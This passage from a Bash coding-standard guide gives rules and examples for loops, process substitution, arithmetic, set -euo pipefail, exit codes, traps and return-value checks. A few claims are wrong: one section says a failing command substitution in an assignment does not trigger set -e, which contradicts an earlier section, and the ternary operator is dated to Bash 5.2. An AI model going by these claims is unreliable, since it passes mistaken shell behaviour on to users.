- Terminate every branch with `;;`


---


**Rule: BCS0703**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Bash provides `for`, `while`, and `until` loops. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues.**

**Rationale:**

- For loops efficiently iterate arrays, globs, and ranges while preserving element boundaries with `"${array[@]}"`
- While loops process line-by-line input from commands/files using `< <(command)` to avoid subshell variable scope issues
- Loop control with `break` and `continue` enables early exit and conditional processing

**For loops - Array iteration:**

```bash
#  Iterate over array elements
process_files() {
  local -a files=('document.txt' 'file with spaces.pdf' 'report (final).doc')
  local -- file
  for file in "${files[@]}"; do
    [[ -f "$file" ]] && info "Processing: $file"
  done
}

#  Iterate with index and value
for index in "${!items[@]}"; do
  info "Item $index: ${items[$index]}"
done

#  Iterate over arguments
for arg in "$@"; do
  info "Argument: $arg"
done
```

**For loops - Glob patterns:**

```bash
#  Iterate over glob matches (nullglob ensures empty loop if no matches)
for file in "$SCRIPT_DIR"/*.txt; do
  info "Processing: $file"
done

#  Multiple patterns
for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
  [[ -f "$file" ]] && info "Processing: $file"
done

#  Recursive glob (requires globstar)
shopt -s globstar
for script in "$SCRIPT_DIR"/**/*.sh; do
  [[ -f "$script" ]] && shellcheck "$script"
done

#  Check if glob matched anything
local -a matches=("$SCRIPT_DIR"/*.log)
[[ ${#matches[@]} -eq 0 ]] && return 1
for file in "${matches[@]}"; do
  info "Processing: $file"
done
```

**For loops - C-style:**

```bash
#  Numeric iteration
for ((i=1; i<=10; i+=1)); do
  echo "Count: $i"
done

#  Iterate with step
for ((i=0; i<=20; i+=2)); do
  echo "Even: $i"
done

#  Countdown
for ((i=seconds; i>0; i-=1)); do
  echo "T-minus $i seconds..."
  sleep 1
done

#  Array processing with index
for ((i=0; i<${#items[@]}; i+=1)); do
  echo "Index $i: ${items[$i]}"
done
```

**For loops - Brace expansion:**

```bash
# Range expansion
for i in {1..10}; do echo "Number: $i"; done

# Range with step
for i in {0..100..10}; do echo "Multiple of 10: $i"; done

# Character range
for letter in {a..z}; do echo "Letter: $letter"; done

# Brace expansion with strings
for env in {dev,staging,prod}; do echo "Deploy to: $env"; done

# Zero-padded numbers
for file in file{001..100}.txt; do echo "Filename: $file"; done
```

**While loops - Reading input:**

```bash
#  Read file line by line
read_file() {
  local -- file="$1" line
  local -i line_count=0
  while IFS= read -r line; do
    ((line_count+=1))
    echo "Line $line_count: $line"
  done < "$file"
}

#  Process command output (avoid subshell)
while IFS= read -r line; do
  ((count+=1))
  info "Processing: $line"
done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

#  Read null-delimited input
while IFS= read -r -d '' file; do
  info "Processing: $file"
done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)

#  Read CSV with custom delimiter
while IFS=',' read -r name email age; do
  info "Name: $name, Email: $email, Age: $age"
done < "$csv_file"

#  Read with timeout
if read -r -t 10 input; then
  success "Hello, $input!"
else
  warn 'Timed out waiting for input'
fi
```

**While loops - Argument parsing:**

```bash
#  While loop for argument parsing
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -o|--output)
      noarg "$@"
      shift
      OUTPUT_DIR="$1"
      ;;
    --) shift; break ;;
    -*) die 22 "Invalid option: $1" ;;
    *) INPUT_FILES+=("$1") ;;
  esac
  shift
done
INPUT_FILES+=("$@")  # Collect remaining after --
```

**While loops - Condition-based:**

```bash
#  Wait for condition
wait_for_file() {
  local -- file="$1"
  local -i timeout="${2:-30}" elapsed=0
  while [[ ! -f "$file" ]]; do
    ((elapsed >= timeout)) && return 1
    sleep 1; ((elapsed+=1))
  done
}

#  Retry with exponential backoff
retry_command() {
  local -i max_attempts=5 attempt=1 wait_time=1
  while ((attempt <= max_attempts)); do
    some_command && return 0
    if ((attempt < max_attempts)); then
      warn "Failed, retrying in $wait_time seconds..."
      sleep "$wait_time"
      wait_time=$((wait_time * 2))
    fi
    ((attempt+=1))
  done
  return 1
}

#  Process until resource available
while ((processed < max_items)); do
  get_next_item || break
  process_item
  ((processed+=1))
done
```

**Until loops:**

```bash
#  Until condition met
until systemctl is-active --quiet "$service"; do
  ((elapsed >= timeout)) && return 1
  sleep 1; ((elapsed+=1))
done

#  Avoid - while is usually clearer
until [[ ! -f "$lock_file" ]]; do sleep 1; done

#  Better - equivalent while loop
while [[ -f "$lock_file" ]]; do sleep 1; done
```

**Loop control - break and continue:**

```bash
#  Early exit with break
for file in "${files[@]}"; do
  if [[ -f "$file" && "$file" =~ $pattern ]]; then
    found="$file"
    break  # Stop after first match
  fi
done

#  Skip items with continue
for file in "${files[@]}"; do
  [[ ! -f "$file" ]] && continue  # Skip non-existent
  [[ ! -r "$file" ]] && continue  # Skip unreadable
  [[ ! -s "$file" ]] && continue  # Skip empty
  info "Processing: $file"
done

#  Break out of nested loops
for row in "${matrix[@]}"; do
  for col in $row; do
    if [[ "$col" == 'target' ]]; then
      break 2  # Break both loops
    fi
  done
done

#  Continue in while loop
while IFS= read -r line; do
  [[ -z "$line" ]] && continue      # Skip empty
  [[ "$line" =~ ^# ]] && continue   # Skip comments
  process "$line"
done < "$file"
```

**Infinite loops:**

> **Performance Note:** Benchmark testing (Bash 5.2.21) shows `while ((1))` is fastest (baseline), `while :` is +9-14% slower, `while true` is **+15-22% slower** due to command execution overhead.

```bash
#  RECOMMENDED - Infinite loop (fastest option)
while ((1)); do
  systemctl is-active --quiet "$service" || error "Service $service is down!"
  sleep "$interval"
done

#  RECOMMENDED - Infinite loop with exit condition
while ((1)); do
  [[ ! -f "$pid_file" ]] && break
  process_queue
  sleep 1
done

#  ACCEPTABLE - POSIX-compatible infinite loop
while :; do
  process_item || break
  sleep 1
done

#  AVOID - Slowest option (15-22% slower)
while true; do
  check_status
  sleep 5
done
```

**Nested loops:**

```bash
#  Process matrix data
for row in "${rows[@]}"; do
  for col in "${cols[@]}"; do
    echo "Processing: $row, $col"
  done
done

#  Cross-product iteration
for env in "${environments[@]}"; do
  for region in "${regions[@]}"; do
    info "Testing: $env in $region"
  done
done
```

**Anti-patterns:**

```bash
#  Wrong - iterating over unquoted string
for file in $files_str; do echo "$file"; done  # Word splitting!

#  Correct - iterate over array
for file in "${files[@]}"; do echo "$file"; done

#  Wrong - parsing ls output
for file in $(ls *.txt); do process "$file"; done  # NEVER!

#  Correct - use glob directly
for file in *.txt; do process "$file"; done

#  Wrong - pipe to while (subshell issue)
cat file.txt | while read -r line; do ((count+=1)); done
echo "$count"  # Still 0!

#  Correct - process substitution
while read -r line; do ((count+=1)); done < <(cat file.txt)

#  Wrong - unquoted array
for item in ${array[@]}; do echo "$item"; done

#  Correct - quoted array
for item in "${array[@]}"; do echo "$item"; done

#  Wrong - C-style loop with ++
for ((i=0; i<10; i++)); do echo "$i"; done  # Fails with set -e when i=0!

#  Correct - use +=1
for ((i=0; i<10; i+=1)); do echo "$i"; done

#  Wrong - redundant comparison
while (($# > 0)); do shift; done  # Nonsense: $# is truthy when non-zero

#  Correct - arithmetic context evaluates non-zero as true
while (($#)); do shift; done

#  Wrong - modifying array during iteration
for item in "${array[@]}"; do
  array+=("$item")  # Dangerous!
done

#  Correct - create new array
for item in "${original[@]}"; do
  modified+=("$item" "$item")
done

#  Wrong - seq for iteration
for i in $(seq 1 10); do echo "$i"; done

#  Correct - brace expansion
for i in {1..10}; do echo "$i"; done

#  Wrong - reading without -r flag
while read line; do echo "$line"; done < file.txt

#  Correct - always use -r with read
while IFS= read -r line; do echo "$line"; done < file.txt

#  Wrong - infinite loop without safety
while ((1)); do process_item; done  # No break condition!

#  Correct - infinite loop with exit condition
while ((1)); do
  process_item
  ((iteration+=1))
  ((iteration >= max_iterations)) && break
done
```

**Edge cases:**

1. **Empty arrays** - Zero iterations, no errors
2. **Arrays with empty elements** - Iterates over all elements including empty strings
3. **Glob with no matches** - With `nullglob`: zero iterations; without: one iteration with literal pattern
4. **Loop variable scope** - Variables persist after loop unless declared local
5. **Reading empty files** - Zero iterations

**Summary:**

- **For loops** - arrays, globs, known ranges
- **While loops** - reading input, argument parsing, condition-based iteration
- **Until loops** - rarely used, prefer while with opposite condition
- **Infinite loops** - `while ((1))` fastest, `while :` POSIX-compatible, avoid `while true` (15-22% slower)
- **Always quote arrays** - `"${array[@]}"` for safe iteration
- **Use process substitution** - `< <(command)` avoids subshell in while loops
- **Use i+=1 not i++** - `++` fails with `set -e` when 0
- **Avoid redundant comparisons** - `while (($#))` not `while (($# > 0))`
- **Break and continue** - early exit and conditional skipping
- **Specify break level** - `break 2` for nested loops
- **IFS= read -r** - always use when reading input
- **Check glob matches** - with nullglob or explicit check


---


**Rule: BCS0704**

## Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead.**

**Rationale:**

- **Variable Persistence**: Pipes create subshells; variables modified inside don't persist outside
- **Silent Failure**: No error messages - script continues with wrong values (counters stay 0, arrays empty)
- **Process Substitution Fixes**: `< <(command)` runs loop in current shell, variables persist
- **Readarray Alternative**: For simple line collection, `readarray` is cleaner and faster
- **Set -e Interaction**: Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

```bash
#  WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  ((count+=1))
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)

# Pipe creates process tree:
#   Parent shell (count=0)
#       > Subshell (while loop)
#            - Inherits count=0
#            - Modifies to 3
#            - Subshell exits
#            - Changes discarded!
#   Back to parent (count still 0)
```

**Solution 1: Process substitution**

```bash
#  CORRECT - Avoids subshell
declare -i count=0

while IFS= read -r line; do
  ((count+=1))
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
#  CORRECT - readarray reads all lines into array
declare -a lines
readarray -t lines < <(echo -e "line1\nline2\nline3")

declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3
```

**Solution 3: Here-string (for single variables)**

```bash
#  CORRECT - When input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  ((count+=1))
done <<< "$input"

echo "Count: $count"  # Output: Count: 3
```

**Example: Counting matching lines**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

#  WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file="$1"
  local -i error_count=0

  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    ((error_count+=1))
  done

  echo "Errors: $error_count"  # Always 0!
}

#  CORRECT - Process substitution
count_errors_correct() {
  local -- log_file="$1"
  local -i error_count=0

  while IFS= read -r line; do
    ((error_count+=1))
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
}

#  ALSO CORRECT - Using grep -c when only count matters
count_errors_simple() {
  local -- log_file="$1"
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
}

main() {
  count_errors_correct '/var/log/app.log'
}

main "$@"

#fin
```

**Example: Building array from command output**

```bash
#  WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
}

#  CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct!
}

#  ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users
  readarray -t users < <(getent passwd | cut -d: -f1)

  echo "Users: ${#users[@]}"
}
```

**Example: Multi-variable read with associative array**

```bash
#  WRONG - Associative array stays empty
parse_config_wrong() {
  local -A config=()

  cat config.conf | while IFS='=' read -r key value; do
    config[$key]="$value"
  done

  echo "Config entries: ${#config[@]}"  # 0
}

#  CORRECT - Process substitution
parse_config_correct() {
  local -A config=()

  while IFS='=' read -r key value; do
    [[ "$key" =~ ^[[:space:]]*# ]] && continue
    [[ -z "$key" ]] && continue
    config[$key]="$value"
  done < <(cat config.conf)

  echo "Config entries: ${#config[@]}"  # Correct!
}
```

**When readarray is better:**

```bash
# Simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: $line"
done

# Null-delimited input (handles spaces in filenames)
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**Complete working example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Analyze log file with process substitution
analyze_log() {
  local -- log_file="$1"
  local -i error_count=0 warn_count=0 total_lines=0
  local -a error_lines=()

  while IFS= read -r line; do
    ((total_lines+=1))

    if [[ "$line" =~ ERROR ]]; then
      ((error_count+=1))
      error_lines+=("$line")
    elif [[ "$line" =~ WARN ]]; then
      ((warn_count+=1))
    fi
  done < <(cat "$log_file")

  echo "Analysis of $log_file:"
  echo "  Total lines: $total_lines"
  echo "  Errors: $error_count"
  echo "  Warnings: $warn_count"

  if ((error_count > 0)); then
    echo "Error lines:"
    printf '  %s\n' "${error_lines[@]}"
  fi
}

# Collect configuration with readarray
load_config() {
  local -- config_file="$1"
  local -a config_lines
  local -A config=()

  readarray -t config_lines < <(grep -v '^#' "$config_file" | grep -v '^[[:space:]]*$')

  local -- line key value
  for line in "${config_lines[@]}"; do
    IFS='=' read -r key value <<< "$line"
    config[$key]="$value"
  done

  echo "Configuration loaded: ${#config[@]} entries"
}

main() {
  analyze_log '/var/log/app.log'
  load_config '/etc/app/config.conf'
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
#  WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  ((count+=1))
done
# count still 0!

#  CORRECT - Process substitution
while read -r line; do
  ((count+=1))
done < <(cat file.txt)

#  WRONG - Pipe building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
# files still empty!

#  CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)

#  WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
# has_errors still 0!

#  CORRECT - Use grep return value or process substitution
if grep -q ERROR log; then
  has_errors=1
fi
```

**Edge cases:**

**1. Empty input:**

```bash
declare -i count=0
while read -r line; do
  ((count+=1))
done < <(echo -n "")

echo "Count: $count"  # 0 - correct (no lines)
```

**2. Command failure in process substitution:**

```bash
# With set -e, command failure is detected
while read -r line; do
  process "$line"
done < <(failing_command)  # Script exits if command fails
```

**3. Very large output:**

```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # High RAM usage

# Process substitution processes line by line
while read -r line; do
  process "$line"
done < <(cat huge_file)  # Lower memory usage
```

**4. Null-delimited input (filenames with newlines):**

```bash
# Use -d '' for null-delimited
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Summary:**

- **Never pipe to while** - creates subshell, variables don't persist
- **Use process substitution** - `while read; done < <(command)` - variables persist
- **Use readarray** - `readarray -t array < <(command)` - simple and efficient for line collection
- **Use here-string** - `while read; done <<< "$var"` - when input is in variable
- **Debugging is hard** - script appears to work but uses wrong values (empty counters/arrays)
- **Not a style preference** - this is about correctness; `| while read` is almost certainly a bug


---


**Rule: BCS0705**

## Arithmetic Operations

**Declare integer variables explicitly:**

```bash
# Always declare integer variables with -i flag
declare -i i j result count total

# Or with initial value
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:**
- Automatic arithmetic context (no `$(())` needed)
- Type safety catches non-numeric assignments
- Performance optimization for repeated operations
- Signals numeric intent to readers

**Increment operations:**

```bash
#  PREFERRED: Simple increment
i+=1              # Clearest, most readable
((i+=1))          # Also safe, always returns 0 (success)

#  SAFE: Pre-increment
((++i))           # Returns new value, safe with set -e

#  DANGEROUS: Post-increment
((i++))           # Returns old value BEFORE increment
                  # If i=0, returns 0 (false), triggers set -e exit!
```

**Why `((i++))` is dangerous with `set -e`:**

```bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (old value) = false, script exits!
         # i now equals 1, but next line never reached

echo "This never executes"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed for variables
((result = x * y + z))
((i = j * 2 + 5))
((total = sum / count))

# With $(()), for assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
```

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` `-` | Addition, Subtraction | `((i = a + b))` |
| `*` `/` `%` | Multiply, Divide, Modulo | `((i = a * b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `+=` `-=` | Compound assignment | `((i+=5))` |
| `++` `--` | Increment/Decrement | Use `i+=1` instead |

**Arithmetic conditionals:**

```bash
# Use (()) for arithmetic comparisons
if ((i < j)); then
  echo 'i is less than j'
fi

((count > 0)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'
```

**Comparison operators:**

| Operator | Meaning |
|----------|---------|
| `<` `<=` `>` `>=` | Comparisons |
| `==` `!=` | Equal, Not equal |

**Complex expressions:**

```bash
# Parentheses for grouping
((result = (a + b) * (c - d)))

# Ternary operator (bash 5.2+)
((max = a > b ? a : b))

# Bitwise operations
((flags = flag1 | flag2))  # Bitwise OR
((masked = value & 0xFF))  # Bitwise AND
```

**Anti-patterns:**

```bash
#  Wrong - using [[ ]] for arithmetic
[[ "$count" -gt 10 ]]  # Verbose, old-style

#  Correct - use (())
((count > 10))

#  Wrong - post-increment with set -e
((i++))  # Dangerous when i=0

#  Correct - use +=1
i+=1

#  Wrong - expr command (slow, external)
result=$(expr $i + $j)

#  Correct - use $(()) or (())
result=$((i + j))

#  Wrong - $ inside (())
((result = $i + $j))  # Unnecessary $

#  Correct - no $ inside (())
((result = i + j))

#  Wrong - unnecessary quotes
result="$((i + j))"

#  Correct - no quotes needed
result=$((i + j))
```

**Edge case - Integer division:**

```bash
# Integer division truncates toward zero
((result = 10 / 3))  # result=3, not 3.333...
((result = -10 / 3)) # result=-3

# For floating point, use bc or awk
result=$(bc <<< "scale=2; 10 / 3")  # result=3.33
result=$(awk 'BEGIN {print 10/3}')   # result=3.33333
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0
declare -i max_attempts=5
while ((attempts < max_attempts)); do
  if process_item; then
    break
  fi
  attempts+=1
  ((attempts < max_attempts)) && sleep 1
done
((attempts >= max_attempts)) && die 1 'Max attempts reached'

# Percentage calculation
declare -i total=100
declare -i completed=37
declare -i percentage=$((completed * 100 / total))
echo "Progress: $percentage%"
```


---


**Rule: BCS0800**

# Error Handling

This section establishes comprehensive error handling practices for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument, etc.), explains trap handling for cleanup operations, details proper return value checking patterns, and clarifies when and how to safely suppress errors (using `|| true`, `|| :`, or conditional checks). Error handling must be configured before any other commands run to catch failures early.


---


**Rule: BCS0801**

## Exit on Error
```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Rationale:** Transforms Bash from permissive to strict mode - catches errors immediately, prevents cascading failures, makes scripts behave like compiled languages.

**Handling expected failures:**

```bash
# Allow specific command to fail
command_that_might_fail || true

# Capture exit code
if command_that_might_fail; then
  echo "Success"
else
  echo "Expected failure occurred"
fi

# Temporarily disable errexit
set +e
risky_command
set -e

# Check if optional variable exists
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Anti-patterns:**

```bash
# âœ— Script exits before checking result
result=$(failing_command)  # Exits here with set -e
if [[ -n "$result" ]]; then  # Never reached
  echo "Never gets here"
fi

# âœ“ Disable errexit for assignment
set +e
result=$(failing_command)
set -e
if [[ -n "$result" ]]; then
  echo "Now this works"
fi

# âœ“ Check in conditional context
if result=$(failing_command); then
  echo "Command succeeded: $result"
else
  echo "Command failed, that's okay"
fi
```

**When to disable:** Interactive scripts with recoverable errors, scripts trying multiple approaches, cleanup operations that may fail. Re-enable immediately after.


---


**Rule: BCS0802**

## Exit Codes

**Standard implementation:**
```bash
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
die 0                    # Success (or use `exit 0`)
die 1                    # Exit 1 with no error message
die 1 'General error'    # General error
die 2 'Missing argument' # Missing argument
die 22 'Invalid option'  # Invalid argument
```

**Standard exit codes:**

| Code | Meaning | When to Use |
|------|---------|-------------|
| 0 | Success | Command completed successfully |
| 1 | General error | Catchall for general errors |
| 2 | Misuse of shell builtin | Missing keyword/command, permission denied |
| 22 | Invalid argument | Invalid option provided (EINVAL) |
| 126 | Command cannot execute | Permission problem or not executable |
| 127 | Command not found | Possible typo or PATH issue |
| 128+n | Fatal error signal n | e.g., 130 = Ctrl+C (128+SIGINT) |
| 255 | Exit status out of range | Use 0-255 only |

**Rationale:**
- 0 = success (universal Unix/Linux convention)
- 1 = general error (safe catchall)
- 2 = usage error (matches bash builtin behavior for argument errors)
- 22 = EINVAL (standard errno for invalid argument)
- Use 1-125 for custom codes (avoids signal conflicts with 128+n)

**Common custom codes:**
```bash
die 0 'Success message'         # Success (informational)
die 1 'Generic failure'         # General failure
die 2 'Missing required file'   # Usage error
die 3 'Configuration error'     # Config file issue
die 4 'Network error'           # Connection failed
die 5 'Permission denied'       # Insufficient permissions
die 22 "Invalid option '$1'"    # Bad argument (EINVAL)
```

**Define as constants for readability:**
```bash
readonly -i SUCCESS=0
readonly -i ERR_GENERAL=1
readonly -i ERR_USAGE=2
readonly -i ERR_CONFIG=3
readonly -i ERR_NETWORK=4

die "$ERR_CONFIG" 'Failed to load configuration file'
```

**Checking exit codes:**
```bash
if command; then
  echo "Success"
else
  exit_code=$?
  case $exit_code in
    1) echo "General failure" ;;
    2) echo "Usage error" ;;
    *) echo "Unknown error: $exit_code" ;;
  esac
fi
```


---


**Rule: BCS0803**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir"
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile"

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale:**
- Ensures resource cleanup (temp files, locks, processes) even on errors or signals
- `$?` preserves original exit status
- Trap runs on normal exit, `set -e` errors, Ctrl+C (SIGINT), and kill (SIGTERM)

**Signal types:**

| Signal | Triggers |
|--------|----------|
| `EXIT` | Any script exit (normal or error) |
| `SIGINT` | Ctrl+C |
| `SIGTERM` | `kill` command |
| `ERR` | Command failure with `set -e` |

**Common patterns:**

**Temp file:**
```bash
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
```

**Temp directory:**
```bash
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Lockfile:**
```bash
lockfile="/var/lock/myapp.lock"

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists: $lockfile)"
  fi
  echo $$ > "$lockfile" || die 1 'Failed to create lock file'
  trap 'rm -f "$lockfile"' EXIT
}
```

**Background process:**
```bash
long_running_command &
bg_pid=$!
trap 'kill $bg_pid 2>/dev/null' EXIT
```

**Comprehensive cleanup:**
```bash
#!/usr/bin/env bash
set -euo pipefail

declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  trap - SIGINT SIGTERM EXIT

  ((bg_pid > 0)) && kill "$bg_pid" 2>/dev/null
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir"
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile"

  ((exitcode == 0)) && info 'Script completed successfully' || error "Script exited with error code: $exitcode"
  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

temp_dir=$(mktemp -d)
lockfile="/var/lock/myapp-$$.lock"
echo $$ > "$lockfile"

monitor_process &
bg_pid=$!

main "$@"
```

**Multiple handlers:**
```bash
#  Wrong - second trap replaces first
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT

#  Correct - combine in one trap
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT

#  Or use cleanup function
trap 'cleanup' EXIT
```

**Execution order:**
```bash
trap 'echo "SIGINT handler"' SIGINT
trap 'echo "EXIT handler"' EXIT

# On Ctrl+C: SIGINT handler runs, then EXIT handler, then exit
```

**Critical best practices:**

**1. Prevent recursion:**
```bash
cleanup() {
  # CRITICAL: Disable trap first
  trap - SIGINT SIGTERM EXIT
  rm -rf "$temp_dir"
  exit "$exitcode"
}
```

**2. Preserve exit code:**
```bash
#  Capture $? immediately
trap 'cleanup $?' EXIT

#  Wrong - $? changes between trigger and handler
trap 'cleanup' EXIT
```

**3. Quote trap commands:**
```bash
#  Single quotes delay expansion
trap 'rm -f "$temp_file"' EXIT

#  Double quotes expand now, not on trap
temp_file="/tmp/foo"
trap "rm -f $temp_file" EXIT  # Expands to: trap 'rm -f /tmp/foo' EXIT
temp_file="/tmp/bar"  # Trap still removes /tmp/foo!
```

**4. Set trap early:**
```bash
#  Set trap BEFORE creating resources
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

#  Resource created before trap
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # Temp file leaks if script exits between lines
```

**Anti-patterns:**

```bash
#  Not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT

#  Preserve exit code
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

#  Function without ()
trap cleanup EXIT

#  Function call syntax
trap 'cleanup $?' EXIT

#  Complex logic inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

#  Use cleanup function
cleanup() {
  rm -f "$file1" "$file2"
  kill "$pid" 2>/dev/null
  rm -rf "$dir"
}
trap 'cleanup' EXIT
```

**Edge cases:**

**Disabling traps:**
```bash
trap - EXIT                    # Disable EXIT trap
trap - SIGINT SIGTERM          # Disable signal traps

# Disable during critical section
trap - SIGINT
perform_critical_operation
trap 'cleanup $?' SIGINT       # Re-enable
```

**Summary:**
- Use cleanup function for non-trivial cleanup
- Disable trap inside cleanup to prevent recursion
- Set trap before creating resources
- Preserve exit code with `trap 'cleanup $?' EXIT`
- Use single quotes to delay expansion
- Test with normal exit, errors, and signals


---


**Rule: BCS0804**

## Checking Return Values

**Always check return values of commands and function calls with informative error messages. While `set -e` helps, explicit checking provides better control and messaging.**

**Rationale:**

- **Better Error Messages**: Explicit checks enable contextual error messages
- **Controlled Recovery**: Some failures need cleanup/fallback logic, not immediate exit
- **`set -e` Limitations**: Doesn't catch pipelines (non-final commands), command substitution, or conditional contexts
- **Debugging Aid**: Makes failure points obvious
- **Partial Failure Handling**: Non-critical operations can continue after failure

**When `set -e` fails to catch errors:**

```bash
# 1. Pipelines (except last command)
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!

# 2. Conditionals
if command_that_fails; then
  echo "Runs even though command failed"
fi

# 3. Command substitution in assignments
output=$(failing_command)  # Doesn't exit!

# 4. Commands with || (already handled)
failing_command || echo "Failed but continuing"
```

**Return value checking patterns:**

**Pattern 1: Explicit if check**

```bash
#  Best for critical operations needing context
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move $source_file to $dest_dir"
  error "Check permissions and disk space"
  exit 1
fi
```

**Pattern 2: || with die**

```bash
#  Concise for simple cases
mv "$source_file" "$dest_dir/" || die 1 "Failed to move $source_file"
cp "$config" "$backup" || die 1 "Failed to backup $config to $backup"
```

**Pattern 3: || with command group**

```bash
#  When failure requires cleanup
mv "$temp_file" "$final_location" || {
  error "Failed to move $temp_file to $final_location"
  rm -f "$temp_file"
  exit 1
}

process_file "$input" || {
  error "Processing failed: $input"
  restore_backup
  cleanup_temp_files
  return 1
}
```

**Pattern 4: Capture return code**

```bash
#  When you need the return code value
local -i exit_code
command_that_might_fail
exit_code=$?

if ((exit_code != 0)); then
  error "Command failed with exit code $exit_code"
  return "$exit_code"
fi

#  Different actions for different codes
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  2) die 2 "Parse error" ;;
  3) die 3 "File I/O error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error code: $?" ;;
esac
```

**Pattern 5: Function return values**

```bash
# Define function with meaningful return codes
validate_file() {
  local -- file="$1"

  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22  # Invalid (empty)

